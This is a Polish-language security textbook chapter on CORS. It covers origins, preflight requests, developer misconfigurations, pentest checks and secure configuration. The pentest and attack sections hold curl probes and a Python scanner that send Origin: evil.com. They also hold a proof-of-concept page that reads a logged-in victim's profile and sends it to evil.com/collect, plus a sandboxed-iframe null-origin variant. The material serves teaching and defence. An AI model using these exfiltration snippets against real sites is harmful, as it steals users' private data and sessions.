# Rozdział 13: CORS

## 1. Czym jest CORS

**CORS** (Cross-Origin Resource Sharing) to mechanizm bezpieczeństwa przeglądarki, który kontroluje czy skrypty JavaScript z jednego origin (strony) mogą wykonywać żądania HTTP do innego origin.

Origin to kombinacja: **protokół + host + port**.

```
https://app.example.com:443  →  protokół: https, host: app.example.com, port: 443
http://app.example.com       →  inny protokół → inny origin!
https://api.example.com      →  inny host → inny origin!
https://app.example.com:8080 →  inny port → inny origin!
```

CORS jest rozszerzeniem **Same-Origin Policy** (SOP) — fundamentalnego mechanizmu bezpieczeństwa przeglądarki który domyślnie blokuje cross-origin requesty. CORS pozwala serwerom *selektywnie* zezwolić na cross-origin dostęp.

CORS jest standardem WHATWG Fetch. Kontrola jest po stronie **przeglądarki** i **serwera** — nie można go "wyłączyć" z poziomu JavaScript.

### Nagłówki CORS

**Request headers (wysyłane przez przeglądarkę):**
```http
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization
```

**Response headers (wysyłane przez serwer):**
```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: X-Custom-Header
Access-Control-Max-Age: 86400
```

---

## 2. Dlaczego powstał

### Problem: Same-Origin Policy jest zbyt restrykcyjna

SOP (1995, Netscape) blokuje domyślnie wszystkie cross-origin requesty. To chronione przed kradzieżą danych — skrypt z `evil.com` nie mógł odczytać `bank.com`.

Ale nowoczesne aplikacje webowe *potrzebują* cross-origin requestów:
- Frontend na `app.example.com` musi komunikować się z API na `api.example.com`
- CDN na `cdn.example.com` dostarcza zasoby
- Usługi third-party (płatności, analytics, mapy)

### Stare obejście: JSONP

Przed CORS jedynym obejściem było **JSONP** (JSON with Padding):

```html
<!-- JSONP: tag <script> nie jest ograniczony przez SOP -->
<script src="https://api.example.com/data?callback=processData"></script>
<!-- Serwer zwracał: processData({"user": "Alice"}) -->
```

JSONP jest niebezpieczny (XSS, brak kontroli), CORS go zastąpił.

### CORS jako rozwiązanie

CORS (W3C, 2004-2014) dał serwerom kontrolę nad tym, komu udostępniają dane cross-origin. Przeglądarka przed każdym cross-origin requestem sprawdza czy serwer zezwala.

---

## 3. Jak działa

### Simple vs Preflighted Requests

**Simple Request** (bez preflight):
- Metody: GET, HEAD, POST
- Nagłówki: tylko "bezpieczne" (Accept, Content-Language, Content-Type z value: text/plain, application/x-www-form-urlencoded, multipart/form-data)
- Przeglądarka wysyła request bezpośrednio + nagłówek `Origin`
- Serwer odpowiada z `Access-Control-Allow-Origin`
- Przeglądarka sprawdza czy Origin jest dozwolony → jeśli tak: pokaż odpowiedź JS

**Preflighted Request** (dla wszystkich innych):
- Metody: PUT, DELETE, PATCH lub niestandardowe
- Nagłówki: Authorization, Content-Type: application/json, custom headers
- Przeglądarka najpierw wysyła OPTIONS request (preflight)
- Serwer odpowiada na preflight zezwoleniami
- Jeśli OK → przeglądarka wysyła właściwy request

```
Simple Request:

Browser                          Server
    │                               │
    │─── GET /api/data ────────────►│
    │    Origin: https://app.com    │
    │                               │
    │◄── 200 OK ────────────────────│
    │    Access-Control-Allow-Origin: https://app.com
    │                               │
    JS może odczytać response


Preflighted Request:

Browser                          Server
    │                               │
    │─── OPTIONS /api/data ────────►│  ← PREFLIGHT
    │    Origin: https://app.com    │
    │    Access-Control-Request-Method: PUT
    │    Access-Control-Request-Headers: Authorization
    │                               │
    │◄── 200 OK ────────────────────│  ← PREFLIGHT RESPONSE
    │    Access-Control-Allow-Origin: https://app.com
    │    Access-Control-Allow-Methods: PUT
    │    Access-Control-Allow-Headers: Authorization
    │    Access-Control-Max-Age: 3600
    │                               │
    │─── PUT /api/data ────────────►│  ← WŁAŚCIWY REQUEST
    │    Origin: https://app.com    │
    │    Authorization: Bearer ...  │
    │                               │
    │◄── 200 OK ────────────────────│
    │    Access-Control-Allow-Origin: https://app.com
    │                               │
    JS może odczytać response
```

### Cookies i credentials

```
fetch(url, { credentials: "include" })  ←→  xhr.withCredentials = true

Serwer MUSI mieć:
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://specific-origin.com  ← NIE może być "*"!
```

### Access-Control-Allow-Origin: * — ograniczenia

Wildcard `*` pozwala na wszystkie origin ALE:
- Nie działa z `credentials: "include"`
- Serwer musi to świadomie ustawić — to jest "publiczne API"

### Opaque Response — mode: no-cors

```javascript
fetch("https://api.example.com/data", { mode: "no-cors" })
// Przeglądarka wysyła request
// Odpowiedź to "opaque response" — nie można odczytać body, headers, status
// Używane do: preload, beacon, analytics
// NIE chroni przed eksfiltrację! Request jest wysyłany!
```

---

## 4. Co dzieje się wewnętrznie

### CORS jest egzekwowany przez przeglądarkę, nie serwer

**Kluczowy fakt:** Serwer NIE blokuje requestów z niedozwolonych origin. Serwer po prostu odpowiada lub nie odpowiada nagłówkami CORS. Przeglądarka jest tą, która blokuje JS od odczytania odpowiedzi.

```
Request BEZ CORS (np. przez curl, Postman, atakujący serwer):
→ serwer odpowiada NORMALNIE
→ nie ma CORS enforcement

Request przez PRZEGLĄDARKĘ z innego origin:
→ serwer odpowiada normalnie
→ PRZEGLĄDARKA sprawdza Access-Control-Allow-Origin
→ jeśli brak lub nie pasuje → blokuje JS od odczytania
→ ALE REQUEST DOTARŁ DO SERWERA!
```

To kluczowe: CORS chroni przed *odczytaniem* cross-origin danych przez JavaScript. NIE chroni przed wykonaniem akcji (jak CSRF)!

### Access-Control-Max-Age — cache preflights

```http
Access-Control-Max-Age: 86400
```

Preflight jest cache'owany. Przeglądarka nie będzie wysyłać OPTIONS dla tej kombinacji origin+metoda+nagłówki przez następne 86400 sekund (24h). To optymalizacja wydajności.

### Varies z Origin

Serwer który dynamicznie ustawia Access-Control-Allow-Origin na podstawie Origin requestu MUSI dodać:

```http
Vary: Origin
```

Bez tego cache HTTP może zwrócić odpowiedź dla jednego origin do innego (cache poisoning!).

---

## 5. Analogiczny przykład z życia

CORS to jak polityka przyznawania gości w firmie:

- **Firma (serwer)** ma recepcję i wewnętrzne dane
- **Gość (inny origin)** chce wejść i zobaczyć dane
- **Recepcja (przeglądarka)** sprawdza listę dozwolonych gości

Ważne: **gość (request) DOCIERA do firmy**. Recepcja (przeglądarka) po prostu nie wpuszcza go do środka (blokuje odczyt danych). Ale fakt że gość przyszedł (request) jest zarejestrowany.

**Preflight** = telefon przed przyjazdem: "Czy mogę przyjść z pakowymi dokumentami?" — firma mówi "tak" lub "nie" zanim gość jedzie.

---

## 6. Przykład kodu

```javascript
// === Frontend (https://app.example.com) ===

// Prosty GET — simple request, brak preflight
fetch("https://api.example.com/public/data")
    .then(r => r.json())
    .then(data => console.log(data));

// POST z JSON — preflighted (Content-Type: application/json nie jest simple)
fetch("https://api.example.com/users", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",     // → preflight!
        "Authorization": "Bearer tokenXYZ"       // → preflight!
    },
    credentials: "include",  // wysyłaj cookies cross-origin
    body: JSON.stringify({ name: "Alice" })
});

// Sekwencja:
// 1. Przeglądarka widzi: cross-origin POST z JSON i Authorization → potrzeba preflight
// 2. OPTIONS https://api.example.com/users
//    Origin: https://app.example.com
//    Access-Control-Request-Method: POST
//    Access-Control-Request-Headers: content-type, authorization
// 3. Serwer odpowiada:
//    HTTP/1.1 204 No Content
//    Access-Control-Allow-Origin: https://app.example.com
//    Access-Control-Allow-Methods: POST, GET, PUT, DELETE
//    Access-Control-Allow-Headers: content-type, authorization
//    Access-Control-Allow-Credentials: true
//    Access-Control-Max-Age: 86400
// 4. Przeglądarka wysyła właściwy POST
// 5. Serwer odpowiada z danymi + Access-Control-Allow-Origin
// 6. Przeglądarka przepuszcza JS do odczytania odpowiedzi
```

```javascript
// === Backend (Node.js/Express) — poprawna konfiguracja CORS ===

const cors = require('cors');

const allowedOrigins = [
    'https://app.example.com',
    'https://admin.example.com'
];

app.use(cors({
    origin: function(origin, callback) {
        // Zezwól na zapytania bez origin (np. server-to-server)
        if (!origin) return callback(null, true);
        
        if (allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error(`CORS: origin ${origin} not allowed`));
        }
    },
    credentials: true,           // Access-Control-Allow-Credentials: true
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization", "X-CSRF-Token"],
    exposedHeaders: ["X-Total-Count"],  // nagłówki które JS może odczytać
    maxAge: 86400                // cache preflight na 24h
}));
```

---

## 7. Przykład z prawdziwej aplikacji

### Typowa architektura SPA

```
Frontend: https://app.bank.com
Backend API: https://api.bank.com

Nagłówki odpowiedzi serwera:
Access-Control-Allow-Origin: https://app.bank.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization, Content-Type, X-CSRF-Token
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
Vary: Origin
```

### Mikroserwisy — wewnętrzny CORS

```javascript
// Mikroserwis B wymaga requestów tylko od mikroserwisu A
// Oba działają pod tym samym apex domain

// Frontend (app.company.com) → API Gateway (api.company.com)
// API Gateway → User Service (users.internal.company.com)
// User Service → CORS: zezwól tylko na api.company.com (gateway)
```

### CDN z CORS

```html
<!-- Font z Google Fonts — cross-origin, wymaga CORS -->
<link href="https://fonts.googleapis.com/css2?family=Roboto" rel="stylesheet">

<!-- Google CDN odpowiada:
     Access-Control-Allow-Origin: *
     Cache-Control: public, max-age=31536000
-->

<!-- SRI (Subresource Integrity) w połączeniu z CORS -->
<link rel="stylesheet" 
      href="https://cdn.example.com/style.css"
      integrity="sha384-abc123..."
      crossorigin="anonymous">
```

---

## 8. Typowe błędy programistów

### Błąd 1: Access-Control-Allow-Origin: *  z credentials

```javascript
// BŁĄD: wildcard + credentials → przeglądarka blokuje!
res.setHeader("Access-Control-Allow-Origin", "*");
res.setHeader("Access-Control-Allow-Credentials", "true");
// Przeglądarka: "Nie możesz jednocześnie mieć wildcard i credentials"
// → CORS error w przeglądarce
```

### Błąd 2: Dynamiczne CORS bez walidacji

```javascript
// BŁĄD: echo każdego origin bez walidacji
app.use((req, res, next) => {
    const origin = req.headers.origin;
    res.setHeader("Access-Control-Allow-Origin", origin); // NIEBEZPIECZNE!
    res.setHeader("Access-Control-Allow-Credentials", "true");
    next();
});
// Każda domena na świecie może wykonywać cross-origin requesty z credentials!
// To jest null-CORS bypass!
```

### Błąd 3: Brak Vary: Origin przy dynamicznym CORS

```javascript
// BŁĄD: dynamiczny CORS bez Vary nagłówka
app.use((req, res, next) => {
    if (allowedOrigins.includes(req.headers.origin)) {
        res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
        // Brak: res.setHeader("Vary", "Origin");
    }
    next();
});
// Proxy/CDN może zcache'ować odpowiedź dla origin A i zwrócić ją do origin B!
```

### Błąd 4: CORS na preflight ale nie na właściwym requeście

```javascript
// BŁĄD: obsługa OPTIONS ale nie GET/POST
app.options("*", cors(corsOptions)); // poprawne dla OPTIONS
// Ale:
app.get("/api/data", (req, res) => {
    // Brak CORS headers na GET! Tylko OPTIONS ma CORS.
    res.json(data); // CORS error dla JS!
});

// POPRAWKA: cors middleware na wszystkich routes
app.use(cors(corsOptions));
```

---

## 9. Znaczenie dla bezpieczeństwa

### CORS misconfiguration — krytyczna podatność

Błędna konfiguracja CORS jest jedną z najczęstszych podatności aplikacji webowych:

**Typ 1: Wildcard z credentials (błąd konfiguracji)**
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
Przeglądarka odrzuci, ale pokazuje złą konfigurację.

**Typ 2: Reflektowany Origin bez walidacji**
```javascript
// Podatny serwer odbijający każdy Origin
Access-Control-Allow-Origin: <origin-z-requestu>
Access-Control-Allow-Credentials: true
// → każdy może wykonać credentialled request!
```

**Typ 3: Null Origin**
```http
Access-Control-Allow-Origin: null
```
Niektóre serwery zezwalają na `null` origin. Można go wywołać z sandboxed iframe lub file:// protokołu.

**Typ 4: Słaba walidacja domeny**
```javascript
// BŁĄD: sprawdzanie przez endsWith zamiast exact match
if (origin.endsWith(".example.com")) {
    res.setHeader("Access-Control-Allow-Origin", origin);
}
// Podatne: attackerexample.com → kończy się na example.com!

// Poprawka: exact match lub regex z anchors
const validOrigin = /^https:\/\/(www\.)?example\.com$/.test(origin);
```

### CORS nie chroni przed CSRF

CORS kontroluje *odczytanie* response przez JavaScript. Nie zapobiega wysłaniu requestu.

```
CSRF attack (bez JS):
Browser → form submit → POST /api/transfer → serwer wykonuje!
CORS nie ma wpływu — form submit nie jest CORS request

CSRF attack (przez Fetch z credentials):
Browser → fetch → POST /api/transfer z cookies → serwer wykonuje!
CORS sprawdza czy JS może odczytać response — ale akcja JUŻ WYKONANA!
```

Dlatego potrzeba osobnej CSRF protection (tokeny, SameSite cookies).

### Powiązane CWE

- **CWE-942** — Overly Permissive Cross-domain Whitelist
- **CWE-183** — Permissive List of Allowed Inputs
- **CWE-352** — CSRF (CORS nie zastępuje CSRF protection)

---

## 10. Jak identyfikować podczas pentestu

### Testowanie CORS Misconfiguration

```bash
# Burp Suite lub curl — testuj różne Origin wartości

# Test 1: Reflektowany origin
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=abc" \
     https://api.target.com/user/profile -v
# Sprawdź: Access-Control-Allow-Origin: https://evil.com → podatne!

# Test 2: Null origin
curl -H "Origin: null" \
     https://api.target.com/user/profile -v

# Test 3: Subdomain takeover potential
curl -H "Origin: https://evil.target.com" \
     https://api.target.com/user/profile -v

# Test 4: HTTP vs HTTPS
curl -H "Origin: http://app.target.com" \
     https://api.target.com/user/profile -v
```

### DevTools — sprawdzenie CORS

1. Otwórz **Network** → znajdź cross-origin request
2. Kliknij request → sprawdź zakładkę **Headers**
3. W Request Headers: `Origin:`
4. W Response Headers: `Access-Control-Allow-*`
5. Czy `Access-Control-Allow-Origin` jest wildcard lub zbyt permisywne?

### Burp Suite — CORS Scanner

1. **Target → Site Map** → kliknij prawym → **Scan selected item**
2. Lub użyj Burp Extension: **CORS*

### Skrypt automatycznego testowania

```python
import requests

def test_cors(target_url, session_cookie=""):
    origins_to_test = [
        "https://evil.com",
        "null",
        f"https://evil.{target_url.split('/')[2]}",  # evil.target.com
        f"http://{target_url.split('/')[2]}",          # HTTP zamiast HTTPS
        f"https://{target_url.split('/')[2]}.evil.com", # target.com.evil.com
    ]
    
    for origin in origins_to_test:
        headers = {"Origin": origin}
        if session_cookie:
            headers["Cookie"] = session_cookie
        
        r = requests.get(target_url, headers=headers)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        
        if acao == origin or acao == "*":
            if acac.lower() == "true":
                print(f"[CRITICAL] Reflected CORS with credentials: {origin}")
            else:
                print(f"[INFO] Reflected CORS (no credentials): {origin}")
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy Access-Control-Allow-Origin: * jest ustawione na endpointach z danymi użytkownika?
□ Czy Origin jest "odbijany" bez walidacji (reflect-all)?
□ Czy null Origin jest akceptowany?
□ Czy Access-Control-Allow-Credentials: true jest ustawione razem z wildcard?
□ Czy walidacja Origin używa substring match (podatna na evil.target.com)?
□ Czy Vary: Origin jest ustawiony przy dynamicznym CORS?
□ Czy preflight OPTIONS zwraca Access-Control-Max-Age (cache optymalizacja)?
□ Czy CORS na API endpointach jest skonfigurowany per-endpoint czy globalnie?
□ Czy protokół (http vs https) jest weryfikowany w Origin?
□ Czy CORS bypass przez postMessage jest możliwy?
□ Czy subdomeny mogą wykonywać credentialled requesty?
□ Czy serwer error (500) ujawnia CORS nagłówki (może nie ustawiać ich przy błędach)?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: CORS Misconfiguration → kradzież danych

**Wymagania:**
- Serwer odbija każdy Origin z `Access-Control-Allow-Credentials: true`
- Ofiara jest zalogowana na target.com

**Przebieg:**
```html
<!-- Na evil.com (strona atakującego) -->
<!DOCTYPE html>
<html>
<body>
<script>
fetch("https://api.target.com/user/profile", {
    credentials: "include"  // wyślij cookies ofiary
}).then(r => r.json()).then(data => {
    // Odczytaj dane profilu ofiary (normalnie blokowane przez CORS)
    fetch("https://evil.com/collect?data=" + encodeURIComponent(JSON.stringify(data)));
});
</script>
</body>
</html>
```

Ofiara odwiedza evil.com → przeglądarka wykonuje fetch do api.target.com z cookies ofiary → serwer odbija Origin evil.com → przeglądarka pozwala JS odczytać response → dane do evil.com/collect.

**Wpływ:** Odczyt wrażliwych danych użytkownika (profil, karty, historia), przejęcie sesji.

### Scenariusz 2: Null Origin przez sandboxed iframe

**Wymagania:** Serwer akceptuje `Origin: null`.

**Przebieg:**
```html
<!-- Na evil.com -->
<iframe sandbox="allow-scripts" src="data:text/html,
    <script>
    fetch('https://api.target.com/secret', {
        credentials: 'include'
    }).then(r => r.text()).then(data => {
        parent.postMessage(data, '*');
    });
    </script>
">
</iframe>

<script>
window.addEventListener('message', e => {
    // Dane z sandboxed iframe (Origin: null był akceptowany)
    sendToServer(e.data);
});
</script>
```

Sandboxed iframe ma `Origin: null` → jeśli serwer akceptuje null → dane wychodzą.

---

## 13. Jak się zabezpieczać

### Whitelist z dokładną walidacją

```javascript
// Bezpieczna konfiguracja CORS
const ALLOWED_ORIGINS = new Set([
    "https://app.example.com",
    "https://admin.example.com"
]);

function corsMiddleware(req, res, next) {
    const origin = req.headers.origin;
    
    if (!origin) {
        // Server-to-server lub bez Origin (curl, Postman)
        // Decyzja: czy zezwolić? Zazwyczaj tak dla public API, nie dla prywatnego
        next();
        return;
    }
    
    if (ALLOWED_ORIGINS.has(origin)) {
        res.setHeader("Access-Control-Allow-Origin", origin);
        res.setHeader("Access-Control-Allow-Credentials", "true");
        res.setHeader("Vary", "Origin"); // WAŻNE!
    }
    // Jeśli origin nie na liście — nie ustawiaj CORS headers → przeglądarka zablokuje
    
    if (req.method === "OPTIONS") {
        res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
        res.setHeader("Access-Control-Allow-Headers", 
                      "Content-Type, Authorization, X-CSRF-Token");
        res.setHeader("Access-Control-Max-Age", "600");
        return res.sendStatus(204);
    }
    
    next();
}
```

### Nie używaj null Origin

```javascript
// NIGDY:
if (origin === null || origin === "null") {
    res.setHeader("Access-Control-Allow-Origin", "null");
}
// null to Origin z: file://, sandboxed iframe, data: URL
// Nie ma sensu im ufać
```

### Dla publicznych API (bez credentials)

```javascript
// Jeśli API jest publiczne i nie wymaga auth:
res.setHeader("Access-Control-Allow-Origin", "*");
// NIE ustawiaj Access-Control-Allow-Credentials: true
// Wildcard bez credentials jest bezpieczne

// Ale: nie zwracaj wrażliwych danych na endpoint z wildcard!
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. CORS to rozszerzenie SOP — pozwala serwerom selektywnie zezwalać na cross-origin dostęp
2. CORS jest egzekwowany przez PRZEGLĄDARKĘ, nie serwer — serwer odpowiada, przeglądarka decyduje
3. Preflight (OPTIONS) jest wymagany dla non-simple requestów (JSON, Authorization header, PUT/DELETE)
4. `Access-Control-Allow-Origin: *` + `credentials: true` = błąd przeglądarki (niedozwolone)
5. CORS NIE chroni przed CSRF — chroni tylko przed JS odczytaniem cross-origin response

**Najczęstsze nieporozumienia:**

- "CORS jest po stronie serwera" — serwer ustawia nagłówki, ale egzekwowanie jest po stronie przeglądarki
- "CORS blokuje requesty" — CORS blokuje JS od odczytania odpowiedzi. Request dociera do serwera!
- "Access-Control-Allow-Origin: * jest niebezpieczne" — tylko jeśli jest z credentials. Dla publicznych API bez credentials jest ok.

---

## Jak rozpoznać w prawdziwej aplikacji

1. **Network** → cross-origin request → sprawdź nagłówki response: `Access-Control-Allow-*`
2. **Console** → szukaj błędów: `CORS policy: No 'Access-Control-Allow-Origin' header`
3. **Burp Proxy** → wyślij z różnymi `Origin:` nagłówkami → sprawdź czy są odbijane
4. Sprawdź `OPTIONS` requesty w Network — to są preflight'y

---

## Powiązania

```
CORS
    │
    ├──► Fetch API (Rozdział 11) / XHR (Rozdział 12)
    │         CORS stosuje się do cross-origin fetch i XHR
    │
    ├──► Cookies (Rozdział 14)
    │         credentials: "include" + CORS Access-Control-Allow-Credentials
    │
    ├──► COOP/COEP/CORP (Rozdziały 42-44)
    │         Związane mechanizmy izolacji origin
    │
    ├──► CSP (Rozdział 36)
    │         connect-src kontroluje do jakich origin można robić fetch
    │
    └──► Fetch Metadata (Rozdział 39)
                Sec-Fetch-Mode: cors informuje serwer o typie requestu
```
